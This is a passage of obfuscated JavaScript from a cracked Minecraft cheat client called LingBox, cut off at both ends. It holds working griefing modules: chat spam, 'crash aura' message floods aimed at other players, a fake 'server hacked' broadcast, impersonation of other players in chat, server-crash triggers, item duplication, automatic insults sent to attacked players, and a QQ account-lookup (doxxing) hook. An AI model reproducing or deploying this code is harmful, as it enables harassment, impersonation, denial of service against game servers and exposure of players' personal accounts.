            if (定点随机传送提示 == 0x0) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §a开启 末影光环');
                定点随机传送提示 = 0x1;
            }
        }
    } else if (定点随机传送 == false) {
        if (开关提示 == true) {
            if (定点随机传送提示 == 0x1) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §c关闭 末影光环');
                定点随机传送提示 = 0x0;
            }
        }
    }
}

function getPlayerNameList() {
    const _0x992c0b = getWorldPlayerList();
    var _0x1886af = ['未选择玩家'];
    for (i in _0x992c0b) {
        _0x1886af['push'](_0x992c0b[i]['name']);
    }
    return _0x1886af;
}

function 执行刷屏() {
    if (自动刷屏 == true) {
        if (自动刷屏随机颜色 == true) {
            spsjys = getRandomMessageabc(颜色字符串);
        } else if (自动刷屏随机颜色 == false) {
            spsjys = '';
        }
        if (自动刷屏随机发言 == false) {
            if (刷屏后缀 == false) {
                if (spyc >= 刷屏延迟) {
                    for (var _0x30a9f0 = 0x0; _0x30a9f0 < 刷屏速度; _0x30a9f0++) {
                        sendChatMessage(spsjys + 刷屏内容);
                        spyc = 0x0;
                    }
                }
            } else if (刷屏后缀 == true) {
                if (spyc >= 刷屏延迟) {
                    for (var _0x30a9f0 = 0x0; _0x30a9f0 < 刷屏速度; _0x30a9f0++) {
                        sendChatMessage(spsjys + 刷屏内容 + ' | ' + Math['ceil'](Math['random']() * 0xa) + Math['ceil'](Math['random']() * 0xa) + Math['ceil'](Math['random']() * 0xa) + Math['ceil'](Math['random']() * 0xa) + Math['ceil'](Math['random']() * 0xa) + Math['ceil'](Math['random']() * 0xa));
                        spyc = 0x0;
                    }
                }
            }
        } else if (自动刷屏随机发言 == true) {
            if (spyc >= 刷屏延迟) {
                for (var _0x30a9f0 = 0x0; _0x30a9f0 < 刷屏速度; _0x30a9f0++) {
                    curl_get('https://iappht.vipyshy.com/random.php', {
                        'Authorization': 'Bearer token'
                    }, function(_0x182105, _0x2c4a7e) {
                        sendChatMessage(spsjys + _0x2c4a7e['trim']());
                    });
                    spyc = 0x0;
                }
            }
        }
        spyc++;
        if (开关提示 == true) {
            if (刷屏提示 == 0x0) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §a开启 自动刷屏');
                刷屏提示 = 0x1;
            }
        }
    } else if (自动刷屏 == false) {
        if (开关提示 == true) {
            if (刷屏提示 == 0x1) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §c关闭 自动刷屏');
                刷屏提示 = 0x0;
            }
        }
    }
}

function 执行崩溃光环() {
    if (崩溃光环 == true) {
        onCommandOutputEvent();
        if (崩溃光环范围崩溃 == true) {
            if (bkyc >= 崩溃延迟) {
                for (var _0x54130f = 0x0; _0x54130f < 崩溃速度; _0x54130f++) {
                    executeCommand(bkgh);
                    bkyc = 0x0;
                }
            }
        }
        if (崩溃光环创造玩家 == true) {
            executeCommand('/tell @a[rm=0.1,m=1] §k\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n§r');
        }
        if (崩溃光环生存玩家 == true) {
            executeCommand('/tell @a[rm=0.1,m=0] §k\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n§r');
        }
        if (崩溃光环冒险玩家 == true) {
            executeCommand('/tell @a[rm=0.1,m=2] §k\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n§r');
        }
        if (崩溃光环全体玩家 == true) {
            executeCommand('/tell @a[rm=0.1] §k\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n§r');
        }
        if (崩溃光环旁观玩家 == true) {
            executeCommand('/tell @a[rm=0.1,m=spectator] §k\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n§r');
        }
        bkyc++;
        if (开关提示 == true) {
            if (崩溃光环提示 == 0x0) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §a开启 崩溃光环');
                崩溃光环提示 = 0x1;
            }
        }
    } else if (崩溃光环 == false) {
        if (开关提示 == true) {
            if (崩溃光环提示 == 0x1) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §c关闭 崩溃光环');
                崩溃光环提示 = 0x0;
            }
        }
    }
}

function 执行查看坐标() {
    var _0x58987b = getLocalPlayerUniqueID();
    var _0x3d3f9b = getEntityPos(_0x58987b);
    _0x3d3f9b['x'] = Math['ceil'](_0x3d3f9b['x']) - 0x1;
    _0x3d3f9b['y'] = Math['ceil'](_0x3d3f9b['y']) - 0x2;
    _0x3d3f9b['z'] = Math['ceil'](_0x3d3f9b['z']) - 0x1;
    var _0x4b8888 = _0x3d3f9b['x'] + ' ' + _0x3d3f9b['y'] + ' ' + _0x3d3f9b['z'] + '';
    if (查看坐标 == true) {
        addCustomArrayList('坐标显示', ' 当前坐标: ' + _0x4b8888, ' 当前坐标: ' + _0x4b8888, true);
    } else if (查看坐标 == false) {
        addCustomArrayList('坐标显示', ' 当前坐标: ' + _0x4b8888, ' 当前坐标: ' + _0x4b8888, false);
    }
}

function 执行使用时间() {
    计秒++;
    if (计秒 >= 0x14) {
        秒 = 秒 + 0x1;
        计秒 = 0x0;
    }
    if (秒 >= 0x3c) {
        分 = 分 + 0x1;
        秒 = 0x0;
    }
    if (分 >= 0x3c) {
        时 = 时 + 0x1;
        分 = 0x0;
    }
    var _0x5dbd7b = ' LingBox - Crack By: Lossiay正在运行 ' + 时 + '小时 ' + 分 + '分钟 ' + 秒 + '秒';
    if (使用时间 == true) {
        addCustomArrayList('显示使用时间', _0x5dbd7b, _0x5dbd7b, true);
        if (开关提示 == true) {
            if (使用时间显示 == 0x0) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §a开启 显示使用时间');
                使用时间显示 = 0x1;
            }
        }
    } else if (使用时间 == false) {
        addCustomArrayList('显示使用时间', _0x5dbd7b, _0x5dbd7b, false);
        if (开关提示 == true) {
            if (使用时间显示 == 0x1) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §c关闭 显示使用时间');
                使用时间显示 = 0x0;
            }
        }
    }
}

function 执行彩色入侵() {
    if (彩色入侵 == true) {
        if (入侵播放音效 == true) {
            var _0x1f5ac3 = getEntityPos(getLocalPlayerUniqueID());
            if (入侵bfyx >= 0x32) {
                sendSound(0x110, _0x1f5ac3['x'], _0x1f5ac3['y'], _0x1f5ac3['z'], -0x1);
                入侵bfyx = 0x0;
            }
            入侵bfyx++;
        }
        if (入侵隐藏名字 == true) {
            if (csrq == 0x0) {
                executeCommand(入侵ycmz + '§l§a服§b务§c器§d已§e被§f入§6侵');
            }
            if (csrq == 0x1) {
                executeCommand(入侵ycmz + '§l§6服§a务§b器§c已§d被§e入§f侵');
            }
            if (csrq == 0x2) {
                executeCommand(入侵ycmz + '§l§f服§6务§a器§b已§c被§d入§e侵');
            }
            if (csrq == 0x3) {
                executeCommand(入侵ycmz + '§l§e服§f务§6器§a已§b被§c入§d侵');
            }
            if (csrq == 0x4) {
                executeCommand(入侵ycmz + '§l§d服§e务§f器§6已§a被§b入§c侵');
            }
            if (csrq == 0x5) {
                executeCommand(入侵ycmz + '§l§c服§d务§e器§f已§6被§a入§b侵');
            }
            if (csrq == 0x6) {
                executeCommand(入侵ycmz + '§l§b服§c务§d器§e已§f被§6入§a侵');
                csrq = 0x0;
            }
        } else if (入侵隐藏名字 == false) {
            if (csrq == 0x0) {
                sendChatMessage('§l§a服§b务§c器§d已§e被§f入§6侵');
            }
            if (csrq == 0x1) {
                sendChatMessage('§l§6服§a务§b器§c已§d被§e入§f侵');
            }
            if (csrq == 0x2) {
                sendChatMessage('§l§f服§6务§a器§b已§c被§d入§e侵');
            }
            if (csrq == 0x3) {
                sendChatMessage('§l§e服§f务§6器§a已§b被§c入§d侵');
            }
            if (csrq == 0x4) {
                sendChatMessage('§l§d服§e务§f器§6已§a被§b入§c侵');
            }
            if (csrq == 0x5) {
                sendChatMessage('§l§c服§d务§e器§f已§6被§a入§b侵');
            }
            if (csrq == 0x6) {
                sendChatMessage('§l§b服§c务§d器§e已§f被§6入§a侵');
                csrq = 0x0;
            }
        }
        csrq++;
        if (开关提示 == true) {
            if (彩色入侵提示 == 0x0) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §a开启 彩色入侵');
                彩色入侵提示 = 0x1;
            }
        }
    } else if (彩色入侵 == false) {
        if (开关提示 == true) {
            if (彩色入侵提示 == 0x1) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §c关闭 彩色入侵');
                彩色入侵提示 = 0x0;
            }
        }
    }
}

function 执行伪造发言() {
    if (伪造发言 == 0x1) {
        executeCommand('/me @a §k\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n§r§f<' + 伪造发言目标 + '> ' + 伪造发言内容);
        伪造发言 = 0x0;
    }
}

function 执行音效播放器() {
    if (音效播放器 == true) {
        var _0x343758 = getEntityPos(getLocalPlayerUniqueID());
        if (yxbfq >= 音效播放器延迟) {
            for (var _0x25769d = 0x0; _0x25769d < 音效播放器速度; _0x25769d++) {
                sendSound(音效播放器编号, _0x343758['x'], _0x343758['y'], _0x343758['z'], 音效播放器音调);
            }
            yxbfq = 0x0;
        }
        yxbfq++;
        if (开关提示 == true) {
            if (音效播放器提示 == 0x0) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §a开启 音效播放器');
                音效播放器提示 = 0x1;
            }
        }
    } else if (音效播放器 == false) {
        if (开关提示 == true) {
            if (音效播放器提示 == 0x1) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §c关闭 音效播放器');
                音效播放器提示 = 0x0;
            }
        }
    }
}

function 执行丢弃手持物品() {
    if (丢弃手持物品 == true) {
        var _0x2c06cd = getLocalPlayerUniqueID();
        var _0x3bddee = getPlayerSelectItemSlot(_0x2c06cd);
        for (var _0x56cdfc = 0x0; _0x56cdfc < 丢弃手持物品速度; _0x56cdfc++) {
            dropPlayerInventorySlot(_0x2c06cd, _0x3bddee);
        }
        if (开关提示 == true) {
            if (dqscwp == 0x0) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §a开启 丢弃手持物品');
                dqscwp = 0x1;
            }
        }
    } else if (丢弃手持物品 == false) {
        if (开关提示 == true) {
            if (dqscwp == 0x1) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §c关闭 丢弃手持物品');
                dqscwp = 0x0;
            }
        }
    }
}

function 执行丢弃背包() {
    if (丢弃背包 == true) {
        if (dqbb >= 丢弃背包延迟) {
            var _0x17e2b0 = getLocalPlayerUniqueID();
            if (丢弃槽位 >= 丢弃背包起始 && 丢弃槽位 <= 丢弃背包结束) {
                for (var _0x289998 = 0x0; _0x289998 < 丢弃背包速度; _0x289998++) {
                    dropPlayerInventorySlot(_0x17e2b0, 丢弃槽位);
                }
            } else if (丢弃槽位 >= 丢弃背包结束) {
                丢弃槽位 = 丢弃背包起始 - 0x1;
            }
            丢弃槽位++;
            dqbb = 0x0;
        }
        dqbb++;
        if (开关提示 == true) {
            if (丢弃背包提示 == 0x0) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §a开启 丢弃背包');
                丢弃背包提示 = 0x1;
            }
        }
    } else if (丢弃背包 == false) {
        if (开关提示 == true) {
            if (丢弃背包提示 == 0x1) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §c关闭 丢弃背包');
                丢弃背包提示 = 0x0;
            }
        }
    }
}

function 执行崩溃器() {
    if (崩溃器 == true) {
        if (崩溃器刷屏 == true) {
            for (var _0x403d5f = 0x0; _0x403d5f < 0x1; _0x403d5f++) {
                sendChatMessage(崩溃器刷屏内容);
            }
            崩溃器刷屏拦截 = 0x0;
        }
        if (崩溃器发包 == true) {
            for (var _0x403d5f = 0x0; _0x403d5f < 0xc8; _0x403d5f++) {
                executeCommand('/lingbox');
            }
            崩溃器拦截命令 = 0x0;
        }
        if (开关提示 == true) {
            if (崩溃器提示 == 0x0) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §a开启 崩溃器');
                崩溃器提示 = 0x1;
            }
        }
    } else if (崩溃器 == false) {
        if (开关提示 == true) {
            if (崩溃器提示 == 0x1) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §c关闭 崩溃器');
                崩溃器提示 = 0x0;
            }
        }
        崩溃器拦截命令++;
        崩溃器刷屏拦截++;
    }
}

function 执行无限夜视() {
    if (无限夜视 == true) {
        var _0x5e27da = {};
        _0x5e27da['id'] = 0x10;
        _0x5e27da['duration'] = 0x7d2b7500;
        _0x5e27da['amplifier'] = 0xff;
        _0x5e27da['displayOnScreenTextureAnimation'] = false;
        _0x5e27da['noCounter'] = true;
        var _0x3904ee = _0x5e27da;
        setEntityEffect(ysid, _0x3904ee);
        if (无限夜视提示 == 0x0) {
            if (开关提示 == true) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §a开启 无限夜视');
            }
            无限夜视提示 = 0x1;
        }
    } else if (无限夜视 == false) {
        if (无限夜视提示 == 0x1) {
            var _0x575101 = {};
            _0x575101['id'] = 0x10;
            _0x575101['duration'] = 0x0;
            _0x575101['amplifier'] = 0xff;
            _0x575101['displayOnScreenTextureAnimation'] = false;
            _0x575101['noCounter'] = true;
            var _0x3904ee = _0x575101;
            setEntityEffect(ysid, _0x3904ee);
            if (开关提示 == true) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §c关闭 无限夜视');
            }
        }
        无限夜视提示 = 0x0;
    }
}

function 执行自动破坏() {
    if (自动破坏 == true) {
        if (自动破坏连锁破坏 == false) {
            if (自动破坏排除脚下 == false) {
                if (zdph >= 自动破坏延迟) {
                    var _0x5dbb2d = getLocalPlayerUniqueID();
                    var _0xdd290c = getEntityPos(_0x5dbb2d);
                    for (var _0x50d540 = -自动破坏大小; _0x50d540 <= 自动破坏大小; _0x50d540++) {
                        for (var _0x5b1c03 = -自动破坏大小; _0x5b1c03 <= 自动破坏大小; _0x5b1c03++) {
                            for (var _0x867f46 = -自动破坏大小; _0x867f46 <= 自动破坏大小; _0x867f46++) {
                                var _0x2c2319 = Math['ceil'](_0xdd290c['x']) - 0x1 + _0x50d540;
                                var _0x23f29f = Math['ceil'](_0xdd290c['y']) - 0x2 + _0x5b1c03;
                                var _0x49a97c = Math['ceil'](_0xdd290c['z']) - 0x1 + _0x867f46;
                                if (getBlock(_0x2c2319, _0x23f29f, _0x49a97c)['namespace'] !== 'minecraft:air') {
                                    destroyBlock(_0x5dbb2d, _0x2c2319, _0x23f29f, _0x49a97c, 0x1);
                                }
                            }
                        }
                    }
                    zdph = 0x0;
                }
            } else if (自动破坏排除脚下 == true) {
                if (zdph >= 自动破坏延迟) {
                    var _0x5dbb2d = getLocalPlayerUniqueID();
                    var _0xdd290c = getEntityPos(_0x5dbb2d);
                    for (var _0x50d540 = -自动破坏大小; _0x50d540 <= 自动破坏大小; _0x50d540++) {
                        for (var _0x5b1c03 = 0x0; _0x5b1c03 <= 自动破坏大小; _0x5b1c03++) {
                            for (var _0x867f46 = -自动破坏大小; _0x867f46 <= 自动破坏大小; _0x867f46++) {
                                var _0x2c2319 = Math['ceil'](_0xdd290c['x']) - 0x1 + _0x50d540;
                                var _0x23f29f = Math['ceil'](_0xdd290c['y']) - 0x2 + _0x5b1c03;
                                var _0x49a97c = Math['ceil'](_0xdd290c['z']) - 0x1 + _0x867f46;
                                if (getBlock(_0x2c2319, _0x23f29f, _0x49a97c)['namespace'] !== 'minecraft:air') {
                                    destroyBlock(_0x5dbb2d, _0x2c2319, _0x23f29f, _0x49a97c, 0x1);
                                }
                            }
                        }
                    }
                    zdph = 0x0;
                }
            }
        } else if (自动破坏连锁破坏 == true) {
            if (zdph >= 自动破坏延迟) {
                var _0x5dbb2d = getLocalPlayerUniqueID();
                var _0xdd290c = getEntityPos(_0x5dbb2d);
                for (var _0x50d540 = -自动破坏大小; _0x50d540 <= 自动破坏大小; _0x50d540++) {
                    for (var _0x5b1c03 = -自动破坏大小; _0x5b1c03 <= 自动破坏大小; _0x5b1c03++) {
                        for (var _0x867f46 = -自动破坏大小; _0x867f46 <= 自动破坏大小; _0x867f46++) {
                            var _0x2c2319 = Math['ceil'](_0xdd290c['x']) - 0x1 + _0x50d540;
                            var _0x23f29f = Math['ceil'](_0xdd290c['y']) - 0x2 + _0x5b1c03;
                            var _0x49a97c = Math['ceil'](_0xdd290c['z']) - 0x1 + _0x867f46;
                            if (getBlock(_0x2c2319, _0x23f29f, _0x49a97c)['namespace'] == 自动破坏连锁破坏方块) {
                                destroyBlock(_0x5dbb2d, _0x2c2319, _0x23f29f, _0x49a97c, 0x1);
                            }
                        }
                    }
                }
                zdph = 0x0;
            }
        }
        zdph++;
        if (开关提示 == true) {
            if (自动破坏提示 == 0x0) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §a开启 自动破坏');
                自动破坏提示 = 0x1;
            }
        }
    } else if (自动破坏 == false) {
        if (开关提示 == true) {
            if (自动破坏提示 == 0x1) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §c关闭 自动破坏');
                自动破坏提示 = 0x0;
            }
        }
    }
    if (自动破坏连锁破坏方块a == 0x1) {
        showTipMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b点击方块完成设置');
    }
}

function 执行屏蔽掉落物() {
    if (屏蔽掉落物 == true) {
        let _0x132285;
        try {
            _0x132285 = getEntityList();
        } catch (_0x104300) {}
        try {
            for (let _0x52fc16 = 0x0; _0x52fc16 < _0x132285['length']; _0x52fc16++) {
                var _0x255f20;
                try {
                    _0x255f20 = _0x132285[_0x52fc16];
                } catch (_0x3bd5aa) {
                    continue;
                }
                var _0xad779f;
                try {
                    _0xad779f = getEntityTypeId(_0x255f20);
                } catch (_0x53efbe) {
                    continue;
                }
                try {
                    if (_0xad779f == 0x40) {
                        try {
                            for (var _0x3bc065 = 0x0; _0x3bc065 <= 0x5; _0x3bc065++) {
                                attackEntity(_0x255f20, true);
                            }
                        } catch (_0x1d1462) {}
                    }
                } catch (_0x3b5dd9) {}
            }
        } catch (_0x6df32c) {}
        if (开关提示 == true) {
            if (屏蔽掉落物提示 == 0x0) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §a开启 屏蔽掉落物');
                屏蔽掉落物提示 = 0x1;
            }
        }
    } else if (屏蔽掉落物 == false) {
        if (开关提示 == true) {
            if (屏蔽掉落物提示 == 0x1) {
                clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §c关闭 屏蔽掉落物');
                屏蔽掉落物提示 = 0x0;
            }
        }
    }
}

function onClientMessageEvent() {
    if (崩溃器刷屏 == true) {
        return true;
    }
}

function onCommandOutputEvent() {
    if (崩溃光环 == true) {
        return true;
    }
    if (伪造发言 == true) {
        return true;
    }
    if (崩溃器发包 == true) {
        return true;
    }
    if (攻击干扰 == true) {
        return true;
    }
}

function onTickEvent() {
    if (nmb == true) {
        执行刷屏();
        执行崩溃光环();
        执行查看坐标();
        执行使用时间();
        执行彩色入侵();
        执行伪造发言();
        执行音效播放器();
        执行丢弃手持物品();
        执行丢弃背包();
        执行崩溃器();
        执行无限夜视();
        执行自动破坏();
        执行屏蔽掉落物();
        执行定点随机传送();
        执行陀螺();
        执行原地复活();
        执行复制物品();
        执行锁定攻击();
        执行自杀光环();
        执行自动崩服();
        执行自动点击();
        执行挥手修改();
        执行一键扣字();
        执行自动挥手();
        执行自动跳跃();
        执行q绑查询();
        执行回城传送();
        执行上帝模式();
        执行捡掉落物();
        执行百米大刀();
    }
}

function onCallModuleEvent(_0x32ab60) {
    for (key in _0x32ab60) {
        if (key == 'value' || key == 'fun' || key == 'name' || key == 'index' || key == 'key' || key == 'shortcut') continue;
        if (_0x32ab60['index'] == undefined) eval(key + '=' + _0x32ab60[key]);
    }
}

function onSendChatMessageEvent(_0x676007) {
    if (_0x676007 == 'nmb退出') {
        exit();
        clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §c关闭运行');
        return true;
    }
    if (nmb == true) {
        if (_0x676007 == 'nmb刷屏设置') {
            addForm(刷屏设置, function(_0x6fb84b) {
                刷屏内容 = _0x6fb84b;
                spsz = 0x1;
                if (spsz == 0x1) {
                    clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b设置 刷屏内容: §f' + 刷屏内容);
                    spsz = 0x0;
                }
            });
            return true;
        }
        if (_0x676007 == 'nmb伪造发言') {
            addForm(伪造发言设置, function(_0x3507e4, _0x4b8390) {
                伪造发言目标 = player_name_list[_0x3507e4];
                伪造发言内容 = _0x4b8390;
                伪造发言 = 0x1;
            });
            return true;
        }
        if (_0x676007 == 'nmb音效播放器设置') {
            addForm(音效播放器设置, function(_0x4ebb14, _0x8e4c3b) {
                音效播放器编号 = parseFloat(_0x4ebb14);
                音效播放器音调 = parseFloat(_0x8e4c3b);
                ypts = 0x1;
                if (ypts == 0x1) {
                    clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b设置 编号: ' + 音效播放器编号 + ' 音调: ' + 音效播放器音调);
                    ypts = 0x0;
                }
            });
            return true;
        }
        if (_0x676007 == 'nmb音频ID加一') {
            音效播放器编号++;
            clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b设置 编号: ' + 音效播放器编号);
            return true;
        }
        if (_0x676007 == 'nmb音效播放器一键配置') {
            addForm(音效播放器一键配置, function(_0x5e4737) {
                if (_0x5e4737 == 0x0) {
                    音效播放器速度 = 0x1;
                    音效播放器延迟 = 0x28;
                    音效播放器编号 = 0x110;
                    音效播放器音调 = -0x1;
                    clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b加载配置 入侵号角');
                }
                if (_0x5e4737 == 0x1) {
                    音效播放器速度 = 0x14;
                    音效播放器延迟 = 0x14;
                    音效播放器编号 = 0x1b4;
                    音效播放器音调 = -0x1;
                    clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b加载配置 音爆');
                }
                if (_0x5e4737 == 0x2) {
                    音效播放器速度 = 0x14;
                    音效播放器延迟 = 0x14;
                    音效播放器编号 = 0x30;
                    音效播放器音调 = -0x1;
                    clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b加载配置 TNT爆炸');
                }
                if (_0x5e4737 == 0x3) {
                    音效播放器速度 = 0x1;
                    音效播放器延迟 = 0x0;
                    音效播放器编号 = 0x16e;
                    音效播放器音调 = -0x1;
                    clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b加载配置 鬼叫');
                }
                if (_0x5e4737 == 0x4) {
                    音效播放器速度 = 0x14;
                    音效播放器延迟 = 0x64;
                    音效播放器编号 = 0x184;
                    音效播放器音调 = -0x1;
                    clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b加载配置 恐怖');
                }
            });
            return true;
        }
        if (_0x676007 == 'nmb槽位设置') {
            addForm(槽位设置, function(_0x18b48f, _0x5879ba) {
                丢弃背包起始 = _0x18b48f;
                丢弃背包结束 = _0x5879ba;
                槽位设置提示 = 0x1;
                if (槽位设置提示 == 0x1) {
                    clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b设置 起始槽位: ' + 丢弃背包起始 + ' 结束槽位: ' + 丢弃背包结束);
                    槽位设置提示 = 0x0;
                }
            });
            return true;
        }
        if (_0x676007 == 'nmb设置原地为目标') {
            var _0x5170a2 = getEntityPos(getLocalPlayerUniqueID());
            定点随机传送xa = Math['ceil'](_0x5170a2['x']) - 0x1;
            定点随机传送ya = Math['ceil'](_0x5170a2['y']) - 0x2;
            定点随机传送za = Math['ceil'](_0x5170a2['z']) - 0x1;
            clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b设置坐标 ' + 定点随机传送xa + ' ' + 定点随机传送ya + ' ' + 定点随机传送za);
            return true;
        }
        if (_0x676007 == 'nmb设置坐标设置') {
            addForm(定点随机传送坐标设置, function(_0x2465b4, _0x3ca553, _0x21e22b) {
                定点随机传送xa = parseFloat(_0x2465b4);
                定点随机传送ya = parseFloat(_0x3ca553);
                定点随机传送za = parseFloat(_0x21e22b);
                定点随机传送提示a = 0x1;
                if (定点随机传送提示a == 0x1) {
                    clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b设置坐标 ' + 定点随机传送xa + ' ' + 定点随机传送ya + ' ' + 定点随机传送za);
                    定点随机传送提示a = 0x0;
                }
            });
            return true;
        }
        if (_0x676007 == 'nmb_konshoubengfu') {
            buildBlock(getLocalPlayerUniqueID(), 0x0, 0x0, 0x0, 0x6);
            clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b执行 空手崩服');
            return true;
        }
        if (_0x676007 == 'nmb_fuzhiwp') {
            复制物品 = 0x1;
            return true;
        }
        if (_0x676007 == 'nmb_zdbfsz') {
            addForm(自动崩服设置, function(_0x31e871, _0x820fc5, _0x223d4c, _0x17ced2) {
                自动崩服bf = _0x31e871;
                自动崩服jf = _0x820fc5;
                自动崩服ip = _0x17ced2;
                自动崩服sp = _0x223d4c;
            });
            return true;
        }
        if (_0x676007 == 'nmb自动破坏连锁破坏重置') {
            if (自动破坏连锁破坏方块a == 0x0) {
                自动破坏连锁破坏方块a = 0x1;
            }
            return true;
        }
        if (_0x676007 == 'nmbq绑查询') {
            addForm(custom_form, function(_0x414be3) {
                q绑查询qq = _0x414be3;
                q绑查询a = true;
            });
            return true;
        }
        if (_0x676007 == 'nmb回城传送') {
            if (回城传送a == 0x0) {
                回城传送a = 0x1;
            }
            return true;
        }
        if (_0x676007 == 'nmb回城传送设置') {
            回城传送坐标 = getEntityPos(getLocalPlayerUniqueID());
            回城传送坐标x = 回城传送坐标['x'];
            回城传送坐标y = 回城传送坐标['y'];
            回城传送坐标z = 回城传送坐标['z'];
            clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b设置坐标 \n' + 回城传送坐标x + '\n' + 回城传送坐标y + '\n' + 回城传送坐标z);
            return true;
        }
    }
}

function onPlayerAttackEvent(_0x34cd71, _0x141ea5) {
    if (音效 == true) {
        if (打击音效 == true) {
            playSound('/storage/emulated/0/Android/data/com.netease.x19/files/resources/LingBox/打击.mp3');
        }
    }
    if (锁定攻击 == true) {
        锁定攻击mb = _0x141ea5;
    }
    if (攻击干扰 == true) {
        if (卡住目标 == true) {
            var _0x21b984 = getEntityName(_0x141ea5);
            executeCommand('/tell ' + _0x21b984 + ' §k\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n§r');
        }
        if (辱骂目标 == true) {
            var _0x111d68 = getRandomMessage(wb);
            var _0x74f3bb = getRandomMessageabc(颜色字符串);
            var _0x21b984 = getEntityName(_0x141ea5);
            grfs = '/me @' + _0x21b984 + ' ' + _0x74f3bb + _0x111d68;
            executeCommand(grfs);
        }
    }
}

function onPlayerBuildBlockEvent(_0x1bc570, _0x5aa5a8, _0x1ac273, _0x46d336, _0x1991df) {
    if (自动破坏连锁破坏方块a == 0x1) {
        自动破坏连锁破坏方块 = getBlock(_0x5aa5a8, _0x1ac273, _0x46d336)['namespace'];
        clientMessage('§l§g[LingBox - §cC§dr§ba§ec§uk§g] => §b设置 ' + 自动破坏连锁破坏方块);
        自动破坏连锁破坏方块a = 0x0;
    }
    if (音效 == true) {
        if (放置音效 == true) {
            playSound('/storage/emulated/0/Android/data/com.netease.x19/files/resources/LingBox/放置.mp3');
        }
    }
    if (点击破坏 == true) {
        if (点击破坏连锁破坏 == false) {
            for (var _0x13eb7f = -点击破坏大小; _0x13eb7f <= 点击破坏大小; _0x13eb7f++) {
                for (var _0x271425 = -点击破坏大小; _0x271425 <= 点击破坏大小; _0x271425++) {
                    for (var _0x3fd3a5 = -点击破坏大小; _0x3fd3a5 <= 点击破坏大小; _0x3fd3a5++) {
                        var _0x505425 = _0x5aa5a8 + _0x13eb7f;
                        var _0x3a537b = _0x1ac273 + _0x271425;
                        var _0x4680d9 = _0x46d336 + _0x3fd3a5;
                        if (getBlock(_0x505425, _0x3a537b, _0x4680d9)['namespace'] !== 'minecraft:air') {
                            destroyBlock(_0x1bc570, _0x505425, _0x3a537b, _0x4680d9, _0x1991df);
                        }
                    }
                }
            }
        } else if (点击破坏连锁破坏 == true) {
            var _0x2e9bbd = getBlock(_0x5aa5a8, _0x1ac273, _0x46d336)['namespace'];
            for (var _0x13eb7f = -点击破坏大小; _0x13eb7f <= 点击破坏大小; _0x13eb7f++) {
                for (var _0x271425 = -点击破坏大小; _0x271425 <= 点击破坏大小; _0x271425++) {
                    for (var _0x3fd3a5 = -点击破坏大小; _0x3fd3a5 <= 点击破坏大小; _0x3fd3a5++) {
                        var _0x505425 = _0x5aa5a8 + _0x13eb7f;
                        var _0x3a537b = _0x1ac273 + _0x271425;
                        var _0x4680d9 = _0x46d336 + _0x3fd3a5;
                        if (getBlock(_0x505425, _0x3a537b, _0x4680d9)['namespace'] == _0x2e9bbd) {
                            destroyBlock(_0x1bc570, _0x505425, _0x3a537b, _0x4680d9, _0x1991df);
                        }
                    }
                }
            }
        }
    }
}

function onPlayerDestroyBlockEvent() {
    if (音效 == true) {
        if (破坏音效 == true) {
